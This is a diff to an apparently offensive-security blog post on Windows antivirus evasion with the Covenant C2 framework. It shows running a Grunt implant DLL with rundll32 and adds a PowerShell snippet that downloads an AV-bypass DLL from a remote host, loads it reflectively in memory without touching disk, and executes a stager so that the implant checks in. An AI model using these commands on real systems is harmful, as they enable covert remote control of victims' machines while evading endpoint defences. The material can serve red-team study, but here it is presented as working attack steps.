@@ -626,9 +626,9 @@ public class Exports
 
 ```
 
-Add using statements for __System.Runtime.InteropServices__ and __RGiesecke.DllExport__. 
+- Add using statements for __System.Runtime.InteropServices__ and __RGiesecke.DllExport__. 
 
-Open the __Configuration__ __Manager__ and create a New Solution Platform for __x64__ (and x86 if you require).
+- Open the __Configuration__ __Manager__ and create a New Solution Platform for __x64__ (and x86 if you require).
 
 Now build the project then copy the DLL to the target machine and execute with __rundll32__ as follow
 
@@ -636,17 +636,24 @@ Now build the project then copy the DLL to the target machine and execute with _
 rundll32.exe GruntDllName.dll,GruntEntry
 ```
 
-Now you should have your shell.
-
-<p align="center">
-  <img src="/assets/posts/2021-03-01-Windows-Evasion/cov2.JPG">
-</p>
-
-__Note:__ 🚩 Alternatively you can use this reflection technique to download and run a GruntStager EXE directly from memory, without having it touch disk.  For example:
-
+Now you should have your shell on Covenant.
 
 <p align="center">
   <img src="/assets/posts/2021-03-01-Windows-Evasion/cov3.JPG">
+</p> 
+
+__Note:__ 🚩 Alternatively you can use this reflection technique to download and run a GruntStager EXE directly from memory, without having it touch disk.  For example:
+
+```powershell
+PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234/monk-Avbypass.dll)
+PS > [System.Reflection.Assembly]::Load($dll)
+PS > [MonkStager.MonkStager]::Execute()
+```
+
+And note the Grunt checking in:
+
+<p align="center">
+  <img src="/assets/posts/2021-03-01-Windows-Evasion/cov4.JPG">
 </p>
 
 
